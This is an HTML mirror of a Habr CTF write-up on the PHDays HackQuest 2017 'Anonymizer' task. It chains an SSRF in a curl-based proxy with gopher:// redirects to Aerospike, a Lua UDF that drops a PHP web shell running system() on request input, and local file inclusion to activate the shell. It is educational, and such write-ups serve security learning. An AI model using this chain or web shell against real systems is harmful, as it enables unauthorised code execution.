@@ -1,0 +1,141 @@
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-134931760-1');
+  </script>
+
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>[PHDays HackQuest 2017] Anonymizer: SSRF or what can be dangerous curl</title>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+  <meta name="description" content="Analysis of the job Anonymizer (still available here ) with PHDays HackQuest 2017. 
+
+
+
+
+
+
+ After clicking the "GO" button, the following request goes ...">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="stylesheet" href="../../css/main.css">
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>
+       (adsbygoogle = window.adsbygoogle || []).push({
+            google_ad_client: "ca-pub-6974184241884155",
+            enable_page_level_ads: true
+       });
+  </script>
+</head>
+
+<body>
+  <!--[if lte IE 9]>
+    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
+  <![endif]-->
+  <header class="page-header js-page-header">
+    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
+    <div class="page-header-text">Geekly Articles each Day</div>
+  </header>
+  <nav class="page-headings-container js-page-headings-container"></nav>
+  <div class="tools-bar js-tools-bar">
+    <!-- <a href="../../search.html" title="Search">🔎</a> -->
+    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">📜</a>
+    <a class="js-go-to-top-button" href="#" title="Go to Top">⬆️</a>
+    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">⬇️</a>
+  </div>
+  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
+  <section class="page js-page"><h1>[PHDays HackQuest 2017] Anonymizer: SSRF or what can be dangerous curl</h1><div class="post__text post__text-html js-mediator-article"><p>  Analysis of the job Anonymizer (still available <a href="https://anonymizer.rosnadzorcom.ru/">here</a> ) with PHDays HackQuest 2017. </p><br><p><img src="https://habrastorage.org/web/79e/03d/2f0/79e03d2f07c046a1a283152c615af660.png"></p><br><a name="habracut"></a><br><p>  After clicking the "GO" button, the following request goes to the site: </p><br><p><img src="https://habrastorage.org/web/fb3/6d7/fa6/fb36d7fa61854d5e93bc1d6c933e0788.png"></p><br><p>  And in response, we see the contents of the site we requested: </p><br><p><img src="https://habrastorage.org/web/be0/166/1eb/be01661eb732405b94a29ffabf75ead2.png"></p><br><p>  We try together google.com to ask the Anonymizer to show us 127.0.0.1 and we see that the Anonymizer main page comes in response.  This means that the IP address of the host to which the server sends the request is not validated in any way, and using this we can search for some interesting service listening to one of the ports on the local host.  Often, if the service only listens to a localhost, it is not configured to authenticate, which can play into our hands. </p><br><p> First we need to scan ports available on 127.0.0.1.  To do this, we write a small script that will send requests of the form <code>https://anonymizer.rosnadzorcom.ru/?url=127.0.0.1:&lt;port&gt;&amp;page=curl&amp;submit=111</code> and track interesting behavior.  As a result of running the script, it turned out that when queried for ports 3001 and 3003, the connection drops on timeout. </p><br><p><img src="https://habrastorage.org/web/442/a40/d04/442a40d04e524c4f9b791a71d1034794.png"></p><br><p>  Google showed that ports 3000-3003 are using NOSQL <a href="http://www.aerospike.com/docs/operations/configure/network">Aerospike</a> DBMS. </p><br><p>  The most interesting port for us is 3000, since  it is used to manage the DBMS, but the control protocol itself is not a text one (unlike, for example, Redis).  Here we are helped by the fact that the Anonymizer requests web pages using curl, which has a rich application for SSRF (here is <a href="https://hackerone.com/reports/115748">one of the best manuals on using SSRF with curl</a> ). </p><br><p>  We will use the fact that curl supports the Gopher protocol, which allows you to send any data over TCP using curl using a request of the form <code>gopher://&lt;host&gt;/&lt;url-encoded-data&gt;</code> (convenient, right?).  And in order to avoid possible problems with protocol filtering on the server side, let's use the redirect trick: we will make requests to our web server, which will contain the following script: </p><br><pre> <code class="hljs xml"><span class="php"><span class="hljs-meta"><span class="php"><span class="hljs-meta">&lt;?php</span></span></span><span class="php"> header(</span><span class="hljs-string"><span class="php"><span class="hljs-string">'Location: gopher://127.0.0.1:3000/&lt;url-encoded-data&gt;'</span></span></span><span class="php">); </span><span class="hljs-meta"><span class="php"><span class="hljs-meta">?&gt;</span></span></span></span></code> </pre> <br><p>  Since  interaction protocol with Aerospike binary, in order not to waste time on its analysis, we will raise this DBMS on our host and see what traffic is transmitted by the aql management utility for various requests.  For example, here's the traffic matching the query "SHOW NAMESPACES". </p><br><p><img src="https://habrastorage.org/web/cbd/166/7da/cbd1667da34f45ccba11163c9da04874.png"></p><br><p>  We stuff the bytes from the traffic dump into the <code>Location</code> header and compare the result of the query execution by regular means on the test DBMS. </p><br><p><img src="https://habrastorage.org/web/b23/44d/699/b2344d699f8840efb03cab64fe820a57.png"></p><br><p>  and on the taskbar database via SSRF. </p><br><p><img src="https://habrastorage.org/web/cbe/856/e90/cbe856e90b04497cae88563caa7460bb.png"></p><br><p>  In my opinion, it looks pretty similar. </p><br><p>  After small dancing around the DBMS, it became clear that there was no flag in the database itself.  So, you need to get it from the file system.  Since  it is impossible to work with the FS in the stock Aerospike configuration, you need to think of a way to fill and activate the php shell.  This is where the Local File Inclusion vulnerability will help us due to the lack of content filtering for the <code>page</code> parameter. </p><br><p><img src="https://habrastorage.org/web/0a7/31d/bce/0a731dbce5c7455989ae7f80ba2e80bd.png"></p><br><p>  And so, we have a way to activate the shell, it remains only to deliver it to the host.  By the way, you will have to create in Aerospike User Defined Functions, written in LUA.  We write a function that will write the shell at /var/www/html/sl4v.php. </p><br><pre> <code class="hljs xml">function hello_world() file = io.open("/var/www/html/sl4v.php", "w") file:write("<span class="php"><span class="hljs-meta"><span class="php"><span class="hljs-meta">&lt;?php</span></span></span><span class="php"> </span><span class="hljs-keyword"><span class="php"><span class="hljs-keyword">if</span></span></span><span class="php">(</span><span class="hljs-keyword"><span class="php"><span class="hljs-keyword">isset</span></span></span><span class="php">($_REQUEST[</span><span class="hljs-string"><span class="php"><span class="hljs-string">'cmd'</span></span></span><span class="php">])){</span><span class="hljs-keyword"><span class="php"><span class="hljs-keyword">echo</span></span></span><span class="php"> </span><span class="hljs-string"><span class="php"><span class="hljs-string">'&lt;pre&gt;'</span></span></span><span class="php">; $cmd = ($_REQUEST[</span><span class="hljs-string"><span class="php"><span class="hljs-string">'cmd'</span></span></span><span class="php">]); system($cmd); </span><span class="hljs-keyword"><span class="php"><span class="hljs-keyword">echo</span></span></span><span class="php"> </span><span class="hljs-string"><span class="php"><span class="hljs-string">'&lt;/pre&gt;'</span></span></span><span class="php">; </span><span class="hljs-keyword"><span class="php"><span class="hljs-keyword">die</span></span></span><span class="php">;}</span><span class="hljs-meta"><span class="php"><span class="hljs-meta">?&gt;</span></span></span></span>") file:close() return "1" end</code> </pre> <br><p>  Using the <code>REGISTER MODULE</code> and <code>EXECUTE &lt;module&gt;.&lt;function&gt;(&lt;args&gt;) ON &lt;ns&gt;[.&lt;set&gt;]</code> we create and run a UDF on a test base, write traffic, send a request via SSRF and see that the UDF has completed but with an error. </p><br><p><img src="https://habrastorage.org/web/4f3/8f1/373/4f38f1373ff4454792f436258a5204ba.png"></p><br><p>  It seems that the DBMS does not have rights to write to the <code>/var/www/html/</code> folder, but has rights to write to the <code>opt/aerospike/usr/udf/lua/</code> folder.  It remains only to perezalit shell with the correct path and a little search for the flag. </p><br><p><img src="https://habrastorage.org/web/cec/18b/403/cec18b4038a74e859ff67c079456fac0.png"></p><br><p>  Thanks for attention! </p></div>
+      <br>
+        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <ins class="adsbygoogle"
+          style="display:block; text-align:center;"
+          data-ad-layout="in-article"
+          data-ad-format="fluid"
+          data-ad-client="ca-pub-6974184241884155"
+          data-ad-slot="8945601208"></ins>
+        <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+        </script>
+      <br>
+    <p>Source: <a href="https://habr.com/ru/post/328782/">https://habr.com/ru/post/328782/</a></p>
+<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
+<h4>More articles:</h4>
+<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
+<li><a href="../328772/index.html">Dummy Origin: we test work of CDN</a></li>
+<li><a href="../328774/index.html">The book "DevOps Philosophy. IT Management Art</a></li>
+<li><a href="../328776/index.html">Nature has no bad laws. Generation 5, or what will work after LTE?</a></li>
+<li><a href="../328778/index.html">Avito Picture Store History</a></li>
+<li><a href="../328780/index.html">PDUG section on PHDays VII: how to develop applications that hackers do not hack</a></li>
+<li><a href="../328786/index.html">GitLab Values</a></li>
+<li><a href="../328788/index.html">The best way to upload files to Ruby is with Shrine. Part 2. Loader</a></li>
+<li><a href="../328790/index.html">Staff hunger is also not an aunt, or how to grow an IT specialist from a student</a></li>
+<li><a href="../328792/index.html">Everything you didn't know about the CAP theorem</a></li>
+<li><a href="../328794/index.html">How to protect a modern data center</a></li>
+</ul></nav>
+</section><br />
+<a href="../../allArticles.html"><strong>All Articles</strong></a>
+<script src="../../js/main.js"></script>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+  (function (d, w, c) {
+      (w[c] = w[c] || []).push(function() {
+          try {
+              w.yaCounter52496797 = new Ya.Metrika({
+                  id:52496797,
+                  clickmap:true,
+                  trackLinks:true,
+                  accurateTrackBounce:true,
+                  webvisor:true
+              });
+          } catch(e) { }
+      });
+
+      var n = d.getElementsByTagName("script")[0],
+          s = d.createElement("script"),
+          f = function () { n.parentNode.insertBefore(s, n); };
+      s.type = "text/javascript";
+      s.async = true;
+      s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+      if (w.opera == "[object Opera]") {
+          d.addEventListener("DOMContentLoaded", f, false);
+      } else { f(); }
+  })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+
+<!-- Google Analytics -->
+  <script>
+    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
+    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+</section>
+
+  <footer class="page-footer">
+    <div class="page-footer-legal-info-container page-footer-element">
+      <p>
+        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
+      </p>
+    </div>
+    <div class="page-footer-counters-container page-footer-element">
+      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
+    </div>
+  </footer>
+</body>
+
+</html>
